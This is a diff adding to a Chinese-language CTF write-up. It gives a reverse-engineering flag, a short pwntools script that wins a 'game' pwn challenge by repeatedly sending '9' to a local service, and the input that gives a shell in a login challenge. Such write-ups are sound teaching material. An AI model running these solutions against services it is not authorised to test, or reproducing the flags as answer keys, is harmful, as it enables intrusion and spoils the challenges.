@@ -172,3 +172,20 @@ print(flag)
 非常好的题目，教人如何用IDA
 告诉我们 shift+F12可以查看string，而变量或者函数加x可以看到引用
 > flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}
+
+## pwn
+### game
+源代码的意思是每次输入一个个位数，五秒内输到大于999即可，exp如下
+```python
+from pwn import *
+p=remote('127.0.0.1',45393)
+#p=process("./pwn")
+context.log_level='DEBUG'
+for i in range(112):
+    
+    p.sendline(b"9")
+p.interactive()
+
+```
+### real login
+真的是签到，输入NewStar!!!就可以拿shell
